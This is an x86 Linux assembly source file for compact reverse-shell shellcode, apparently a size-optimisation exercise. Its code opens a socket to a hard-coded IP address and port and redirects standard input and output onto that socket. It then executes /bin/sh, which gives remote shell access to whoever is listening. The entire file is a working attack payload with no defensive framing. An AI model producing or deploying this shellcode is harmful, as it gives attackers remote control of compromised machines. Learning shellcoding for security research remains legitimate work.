; Filename:    reverse-shell_optimized.nasm
; Author:      Joshua Arnold
; Website:     https://huskersec.com
;
;
; Purpose:     Creates a reverse shell upon execution
; Explanation:
; Number of bytes: original 92; now 78

BITS 32
global _start			

section .text
_start:

	;zeroing out ebx, eax and edx - because mul acts on eax and edx
	xor ebx,ebx
	mul ebx

	;socket(2,1,0)
	push eax
	push byte 0x1
	push byte 0x2
	mov ecx,esp
	inc ebx        ;socketcall "socket" value
	mov al,0x66    ;linux syscall value for socketcall
	int 0x80
	mov esi,eax

	;connect(fd,sockaddr,socklen_t address_len)
	inc ebx
	push 0x9503a8c0		 ;ip address of 192.168.3.149
	push word 0xe110         ;port 4321
	push word bx	         ;address family: AF_INET
	mov ecx,esp              ;move esp containing address of struct into ecx
	push byte 16
	push ecx
	push esi
	mov ecx,esp
	inc ebx
	mov al,0x66
	int 0x80	


;	xor ebx,ebx

	; dup2() setup
	xor ecx,ecx
	mov ebx,esi

        ; dup2 repetition
        mov cl,0x3
        dup2:
        dec cl
        mov al,0x3f
        int 0x80
        jne dup2


	;execve(file,argv,envp)
	push edx
	push long 0x68732f2f
	push long 0x6e69622f
	mov ebx,esp
	push edx
	push ebx
	mov ecx,esp
	mov al,0x0b
	int 0x80
